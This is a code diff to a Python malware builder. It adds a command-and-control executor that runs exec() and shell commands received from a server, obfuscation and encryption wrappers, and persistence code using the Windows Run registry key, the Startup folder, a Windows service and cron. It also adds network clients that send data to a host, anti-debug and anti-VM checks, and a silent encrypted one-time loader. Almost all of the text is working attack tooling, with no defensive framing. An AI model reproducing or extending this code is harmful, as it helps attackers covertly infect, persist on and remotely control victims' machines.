@@ -5,6 +5,13 @@ import string
 import os
 import ast
 import re
+import json
+import uuid
+import time
+import subprocess
+import tempfile
+import sys
+import threading
 from typing import Optional, Dict, List, Union
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
@@ -31,6 +38,7 @@ import os
 import sys
 import threading
 import time
+import socket
 from cryptography.fernet import Fernet
 
 class PayloadExecutor:
@@ -68,13 +76,40 @@ class PayloadExecutor:
         except Exception as e:
             return subprocess.CompletedProcess([], 1, '', str(e))
     
+    def connect(self, host='127.0.0.1', port=8080):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((host, port))
+            return sock
+        except Exception as e:
+            print(f"Connection error: {{e}}")
+            return None
+    
+    def heartbeat_thread(self, sock):
+        '''Send periodic heartbeats to the server'''
+        while self.running:
+            try:
+                sock.sendall(b'HEARTBEAT')
+                time.sleep(30)
+            except:
+                break
+    
+    def process_command(self, command):
+        '''Process commands received from the server'''
+        if command.startswith('EXEC:'):
+            code = command[5:]
+            exec(code)
+        elif command.startswith('SHELL:'):
+            cmd = command[6:]
+            subprocess.run(cmd, shell=True)
+    
     def run(self):
         while self.running:
             try:
                 # Your payload code here
                 {payload_code}
             except Exception as e:
-                print(f"Error: {e}")
+                print(f"Error: {{e}}")
             time.sleep(1)
 
 if __name__ == '__main__':
@@ -122,14 +157,22 @@ if __name__ == '__main__':
             return f'{quote}{encoded}{quote}'
         
         # Replace string literals with encoded versions
-        code = re.sub(string_pattern, encode_string, code)
+        try:
+            code = re.sub(string_pattern, encode_string, code)
+        except Exception:
+            # If encoding fails, return the original code
+            pass
         
         # Add string decoding at the beginning
         code = "import base64\n" + code
         
         # Replace string usage with decoded versions
-        code = re.sub(r'base64\.b64encode\((["\'].*?["\'])\)', 
-                     lambda m: f'base64.b64decode({m.group(1)}).decode()', code)
+        try:
+            code = re.sub(r'base64\.b64encode\((["\'].*?["\'])\)', 
+                        lambda m: f'base64.b64decode({m.group(1)}).decode()', code)
+        except Exception:
+            # If substitution fails, continue with the current code
+            pass
         
         return code
     
@@ -188,6 +231,27 @@ def {func_name}():
         
         return '\n'.join(transformed)
     
+    def generate_obfuscated_payload(self, code: str, obfuscation_level: int = 1) -> str:
+        """
+        Generate an obfuscated payload with variable levels of obfuscation.
+        
+        Args:
+            code: The Python code to obfuscate
+            obfuscation_level: Level of obfuscation (1-3)
+            
+        Returns:
+            Obfuscated payload string
+        """
+        if obfuscation_level == 1:
+            # Basic obfuscation: variable name randomization
+            return self._basic_obfuscation(code)
+        elif obfuscation_level == 2:
+            # Medium obfuscation: string encoding and variable randomization
+            return self._medium_obfuscation(code)
+        else:
+            # Advanced obfuscation: full code transformation
+            return self._advanced_obfuscation(code)
+    
     def generate_polymorphic_payload(self, code: str, variants: int = 3) -> List[str]:
         """
         Generate multiple polymorphic variants of the payload.
@@ -215,12 +279,7 @@ def {func_name}():
                 transformed_code = self._rename_functions(transformed_code)
             
             # Apply obfuscation
-            if obfuscation_level == 1:
-                transformed_code = self._basic_obfuscation(transformed_code)
-            elif obfuscation_level == 2:
-                transformed_code = self._medium_obfuscation(transformed_code)
-            else:
-                transformed_code = self._advanced_obfuscation(transformed_code)
+            transformed_code = self.generate_obfuscated_payload(transformed_code, obfuscation_level)
             
             variants_list.append(transformed_code)
         
@@ -274,6 +333,55 @@ def {func_name}():
             code = re.sub(r'\b' + old_name + r'\b', new_name, code)
         
         return code
+    
+    def generate_encrypted_payload(self, code: str, compress: bool = True) -> str:
+        """
+        Generate an encrypted payload.
+        
+        Args:
+            code: The Python code to encrypt
+            compress: Whether to compress the payload before encryption
+            
+        Returns:
+            Encrypted payload string
+        """
+        # Compress the code if requested
+        if compress:
+            code = zlib.compress(code.encode())
+        else:
+            code = code.encode()
+        
+        # Encrypt the code
+        encrypted = self.fernet.encrypt(code)
+        
+        # Base64 encode for safe transmission
+        return base64.b64encode(encrypted).decode()
+    
+    def wrap_code(self, code: str) -> str:
+        """
+        Wrap code in the payload wrapper template.
+        
+        Args:
+            code: The Python code to wrap
+            
+        Returns:
+            Wrapped code with the payload wrapper
+        """
+        # Properly indent the code for insertion into the run method
+        indented_code = '\n'.join('                ' + line for line in code.split('\n'))
+        
+        try:
+            return self.payload_wrapper.format(
+                encryption_key=self.encryption_key,
+                payload_code=indented_code
+            )
+        except KeyError as e:
+            # If there's a KeyError, fix the payload wrapper template
+            fixed_wrapper = self.payload_wrapper.replace("{e}", "{{e}}")
+            return fixed_wrapper.format(
+                encryption_key=self.encryption_key,
+                payload_code=indented_code
+            )
     
     def generate_anti_vm_payload(self, code: str) -> str:
         """
@@ -642,6 +750,463 @@ threading.Thread(target=c2_client.run, daemon=True).start()
 """
         return c2_code
     
+    def generate_persistent_payload(self, code: str, persistence_method: str = 'registry') -> str:
+        """
+        Generate a persistent payload that survives system reboots.
+        
+        Args:
+            code: The Python code to make persistent
+            persistence_method: Method of persistence ('registry', 'startup', 'service', 'cron')
+            
+        Returns:
+            Persistent payload string
+        """
+        persistence_code = ""
+        
+        if persistence_method == 'registry':
+            persistence_code = self._generate_registry_persistence(code)
+        elif persistence_method == 'startup':
+            persistence_code = self._generate_startup_persistence(code)
+        elif persistence_method == 'service':
+            persistence_code = self._generate_service_persistence(code)
+        elif persistence_method == 'cron':
+            persistence_code = self._generate_cron_persistence(code)
+        
+        return persistence_code
+    
+    def _generate_registry_persistence(self, code: str) -> str:
+        """Generate registry-based persistence code"""
+        return f"""
+import winreg
+import os
+import sys
+
+def add_to_registry():
+    key = winreg.HKEY_CURRENT_USER
+    key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    
+    try:
+        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
+            winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, sys.executable + " " + __file__)
+    except Exception as e:
+        print(f"Registry error: {{e}}")
+        pass
+
+# Add to registry on startup
+add_to_registry()
+
+{code}
+"""
+    
+    def _generate_startup_persistence(self, code: str) -> str:
+        """Generate startup folder persistence code"""
+        return f"""
+import os
+import shutil
+import sys
+
+def create_startup_script():
+    # Create a startup script
+    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    return startup_path
+
+def add_to_startup():
+    startup_path = create_startup_script()
+    target_path = os.path.join(startup_path, 'SystemService.pyw')
+    
+    try:
+        shutil.copy2(__file__, target_path)
+    except Exception as e:
+        print(f"Startup error: {{e}}")
+
+# Add to startup on execution
+add_to_startup()
+
+{code}
+"""
+    
+    def _generate_service_persistence(self, code: str) -> str:
+        """Generate Windows service persistence code"""
+        return f"""
+import win32serviceutil
+import win32service
+import win32event
+import servicemanager
+import socket
+
+class SystemService(win32serviceutil.ServiceFramework):
+    _svc_name_ = "SystemService"
+    _svc_display_name_ = "System Service"
+    
+    def __init__(self, args):
+        win32serviceutil.ServiceFramework.__init__(self, args)
+        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
+        socket.setdefaulttimeout(60)
+    
+    def SvcStop(self):
+        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+        win32event.SetEvent(self.hWaitStop)
+    
+    def SvcDoRun(self):
+        servicemanager.LogMsg(
+            servicemanager.EVENTLOG_INFORMATION_TYPE,
+            servicemanager.PYS_SERVICE_STARTED,
+            (self._svc_name_, '')
+        )
+        self.main()
+    
+    def main(self):
+        {code}
+
+if __name__ == '__main__':
+    win32serviceutil.HandleCommandLine(SystemService)
+"""
+    
+    def _generate_cron_persistence(self, code: str) -> str:
+        """Generate Linux crontab-based persistence code"""
+        return f"""
+import os
+import sys
+import subprocess
+
+def add_to_cron():
+    # Path to current script
+    script_path = os.path.abspath(__file__)
+    
+    # Create cron job to run script at reboot
+    cron_job = f"@reboot {sys.executable} {script_path}"
+    
+    try:
+        # Add to user's crontab
+        existing_crontab = subprocess.check_output("crontab -l", shell=True, text=True)
+        if script_path not in existing_crontab:
+            with open('/tmp/crontab_new', 'w') as f:
+                f.write(existing_crontab)
+                f.write(cron_job + "\\n")
+            subprocess.run("crontab /tmp/crontab_new", shell=True)
+            os.remove('/tmp/crontab_new')
+    except subprocess.CalledProcessError:
+        # No existing crontab
+        with open('/tmp/crontab_new', 'w') as f:
+            f.write(cron_job + "\\n")
+        subprocess.run("crontab /tmp/crontab_new", shell=True)
+        os.remove('/tmp/crontab_new')
+    except Exception as e:
+        print(f"Cron error: {{e}}")
+
+# Add to crontab on execution
+add_to_cron()
+
+{code}
+"""
+    
+    def generate_network_payload(self, code: str, protocol: str = 'http', 
+                              host: str = 'localhost', port: int = 8080) -> str:
+        """
+        Generate a network-aware payload that can communicate over various protocols.
+        
+        Args:
+            code: The Python code to make network-aware
+            protocol: Network protocol to use ('http', 'tcp', 'udp')
+            host: Target host
+            port: Target port
+            
+        Returns:
+            Network-aware payload string
+        """
+        if protocol == 'http':
+            return self._generate_http_payload(code, host, port)
+        elif protocol == 'tcp':
+            return self._generate_tcp_payload(code, host, port)
+        else:
+            return self._generate_udp_payload(code, host, port)
+    
+    def _generate_http_payload(self, code: str, host: str, port: int) -> str:
+        """Generate HTTP-based network payload"""
+        return f"""
+import requests
+import json
+import time
+
+class NetworkClient:
+    def __init__(self):
+        self.host = '{host}'
+        self.port = {port}
+        self.base_url = f'http://{{self.host}}:{{self.port}}'
+    
+    def send_data(self, data):
+        try:
+            response = requests.post(
+                f'{{self.base_url}}/data',
+                json=data,
+                timeout=5
+            )
+            return response.json()
+        except Exception as e:
+            print(f"HTTP error: {{e}}")
+            return None
+
+# Create network client
+network = NetworkClient()
+
+{code}
+"""
+    
+    def _generate_tcp_payload(self, code: str, host: str, port: int) -> str:
+        """Generate TCP-based network payload"""
+        return f"""
+import socket
+import json
+import time
+
+class NetworkClient:
+    def __init__(self):
+        self.host = '{host}'
+        self.port = {port}
+        self.socket = None
+    
+    def connect(self):
+        try:
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.connect((self.host, self.port))
+            return True
+        except Exception as e:
+            print(f"TCP connection error: {{e}}")
+            return False
+    
+    def send_data(self, data):
+        try:
+            if not self.socket:
+                if not self.connect():
+                    return None
+            
+            message = json.dumps(data).encode()
+            self.socket.sendall(message)
+            response = self.socket.recv(4096)
+            return json.loads(response.decode())
+        except Exception as e:
+            print(f"TCP error: {{e}}")
+            return None
+
+# Create network client
+network = NetworkClient()
+network.connect()
+
+{code}
+"""
+    
+    def _generate_udp_payload(self, code: str, host: str, port: int) -> str:
+        """Generate UDP-based network payload"""
+        return f"""
+import socket
+import json
+import time
+
+class NetworkClient:
+    def __init__(self):
+        self.host = '{host}'
+        self.port = {port}
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    def send_data(self, data):
+        try:
+            message = json.dumps(data).encode()
+            self.socket.sendto(message, (self.host, self.port))
+            return True
+        except Exception as e:
+            print(f"UDP error: {{e}}")
+            return None
+
+# Create network client
+network = NetworkClient()
+
+{code}
+"""
+    
+    def generate_anti_debug_payload(self, code: str) -> str:
+        """
+        Generate a payload with anti-debugging capabilities.
+        
+        Args:
+            code: The Python code to protect
+            
+        Returns:
+            Anti-debug protected payload string
+        """
+        anti_debug_code = """
+import ctypes
+import sys
+import os
+import time
+
+def is_debugger_present():
+    # Check for common debugger indicators
+    try:
+        return ctypes.windll.kernel32.IsDebuggerPresent()
+    except:
+        return False
+
+def check_for_virtual_machine():
+    # Check for common VM indicators
+    try:
+        return any(vm in os.environ.get('PROCESSOR_IDENTIFIER', '').lower() 
+                  for vm in ['vmware', 'virtualbox', 'qemu'])
+    except:
+        return False
+
+def anti_debug_loop():
+    while True:
+        if is_debugger_present() or check_for_virtual_machine():
+            # Trigger anti-debug behavior
+            sys.exit(1)
+        time.sleep(1)
+
+# Start anti-debug thread
+threading.Thread(target=anti_debug_loop, daemon=True).start()
+"""
+        return anti_debug_code + code
+    
+    def generate_c2_ready_payload(self, code: str, features: Dict[str, Union[bool, str, int]] = None, 
+                                payload_id: str = None) -> Dict:
+        """
+        Generate a payload specifically designed for the C2 server to send to clients.
+        
+        Args:
+            code: The Python code to use in the payload
+            features: Dictionary of features to enable/configure
+            payload_id: Optional ID for the payload (generated if not provided)
+            
+        Returns:
+            Dictionary with payload details ready for C2 server
+        """
+        features = features or {}
+        payload_id = payload_id or str(uuid.uuid4())
+        
+        # Process the code based on features
+        processed_code = code
+        
+        # Apply obfuscation if requested
+        if features.get('obfuscation_level', 0) > 0:
+            processed_code = self.generate_obfuscated_payload(
+                processed_code, 
+                features.get('obfuscation_level', 1)
+            )
+        
+        # Compress the code (always for C2 payloads)
+        compressed = zlib.compress(processed_code.encode())
+        
+        # Encrypt the code (always for C2 payloads)
+        encrypted = self.fernet.encrypt(compressed)
+        
+        # Base64 encode for safe transmission
+        encoded_payload = base64.b64encode(encrypted).decode()
+        
+        # Create the payload task object
+        payload_task = {
+            "id": payload_id,
+            "type": "payload", 
+            "payload": encoded_payload,
+            "features": features,
+            "timestamp": int(time.time())
+        }
+        
+        return payload_task
+        
+    def generate_one_time_payload(self, code: str, features: Dict[str, Union[bool, str, int]] = None) -> str:
+        """
+        Generate a standalone one-time execution payload that doesn't require the C2 infrastructure.
+        This is useful for initial access or disconnected operations.
+        
+        Args:
+            code: The Python code to execute
+            features: Dictionary of features to enable/configure
+            
+        Returns:
+            String with the complete payload code
+        """
+        features = features or {}
+        
+        # Basic template for one-time execution
+        template = """
+import base64
+import zlib
+import subprocess
+import tempfile
+import os
+import sys
+import uuid
+from cryptography.fernet import Fernet
+
+def execute_payload():
+    try:
+        # Payload data (encrypted and compressed)
+        payload_data = {payload_data!r}
+        
+        # Decrypt and decompress
+        fernet = Fernet({encryption_key!r})
+        decrypted = fernet.decrypt(payload_data.encode())
+        decompressed = zlib.decompress(decrypted)
+        
+        # Create a temporary file
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as temp_file:
+            temp_file.write(decompressed)
+            temp_path = temp_file.name
+        
+        try:
+            # Execute the payload
+            result = subprocess.run(
+                [sys.executable, temp_path],
+                capture_output=True,
+                text=True,
+                timeout=300
+            )
+            
+            # Log the result if needed
+            with open(os.path.join(tempfile.gettempdir(), 'execution.log'), 'w') as log_file:
+                log_file.write(f"Exit code: {{result.returncode}}\\n")
+                log_file.write(f"Output: {{result.stdout}}\\n")
+                log_file.write(f"Error: {{result.stderr}}\\n")
+                
+            return result.returncode == 0
+        finally:
+            # Clean up
+            try:
+                os.unlink(temp_path)
+            except:
+                pass
+    except Exception as e:
+        # Silent failure
+        return False
+
+if __name__ == '__main__':
+    execute_payload()
+"""
+        
+        # Process the code based on features
+        processed_code = code
+        
+        # Apply obfuscation if requested
+        if features.get('obfuscation_level', 0) > 0:
+            processed_code = self.generate_obfuscated_payload(
+                processed_code, 
+                features.get('obfuscation_level', 1)
+            )
+        
+        # Compress the code
+        compressed = zlib.compress(processed_code.encode())
+        
+        # Encrypt the code
+        encrypted = self.fernet.encrypt(compressed)
+        
+        # Base64 encode for safe transmission
+        encoded_payload = base64.b64encode(encrypted).decode()
+        
+        # Fill in the template
+        return template.format(
+            payload_data=encoded_payload,
+            encryption_key=self.encryption_key
+        )
+    
     def generate_payload(self, code: str, features: Dict[str, Union[bool, str, int]] = None) -> str:
         """
         Generate a payload with specified features.
@@ -655,6 +1220,10 @@ threading.Thread(target=c2_client.run, daemon=True).start()
         """
         features = features or {}
         
+        # Handle legacy feature naming (e.g. "obfuscation" instead of "obfuscation_level")
+        if "obfuscation" in features and features["obfuscation"] and "obfuscation_level" not in features:
+            features["obfuscation_level"] = 1
+        
         # Apply obfuscation if requested
         if features.get('obfuscation_level', 0) > 0:
             code = self.generate_obfuscated_payload(
@@ -663,21 +1232,19 @@ threading.Thread(target=c2_client.run, daemon=True).start()
             )
         
         # Apply encryption if requested
-        if features.get('encrypt', False):
+        if features.get('encrypt', False) or features.get('encryption', False):
             code = self.generate_encrypted_payload(
                 code,
                 features.get('compress', True)
             )
         
         # Apply persistence if requested
-        if features.get('persistence'):
-            code = self.generate_persistent_payload(
-                code,
-                features.get('persistence_method', 'registry')
-            )
+        if features.get('persistence', False):
+            method = features.get('persistence_method', 'registry')
+            code = self.generate_persistent_payload(code, method)
         
         # Apply networking if requested
-        if features.get('network'):
+        if features.get('network', False):
             code = self.generate_network_payload(
                 code,
                 features.get('protocol', 'http'),
@@ -694,7 +1261,7 @@ threading.Thread(target=c2_client.run, daemon=True).start()
             code = self.generate_anti_vm_payload(code)
         
         # Apply process injection if requested
-        if features.get('process_injection'):
+        if features.get('process_injection', False):
             code = self.generate_process_injection_payload(
                 code,
                 features.get('target_process', 'explorer.exe')
@@ -705,15 +1272,24 @@ threading.Thread(target=c2_client.run, daemon=True).start()
             code = self.generate_rootkit_payload(code)
         
         # Apply C2 if requested
-        if features.get('c2'):
+        if features.get('c2', False):
             code = self.generate_c2_payload(
                 code,
                 features.get('c2_servers', ['localhost:8080']),
                 features.get('fallback_interval', 300)
             )
         
-        # Wrap the final code in the payload executor
-        return self.payload_wrapper.format(
-            encryption_key=self.encryption_key,
-            payload_code=code
-        )
+        # Fix: Make sure we're using the right format pattern for the payload wrapper
+        # Format requires 'encryption_key' and 'payload_code' named placeholders
+        try:
+            return self.payload_wrapper.format(
+                encryption_key=self.encryption_key,
+                payload_code=code
+            )
+        except KeyError as e:
+            # If there's a KeyError, fix the payload wrapper template
+            fixed_wrapper = self.payload_wrapper.replace("{e}", "{{e}}")
+            return fixed_wrapper.format(
+                encryption_key=self.encryption_key,
+                payload_code=code
+            )
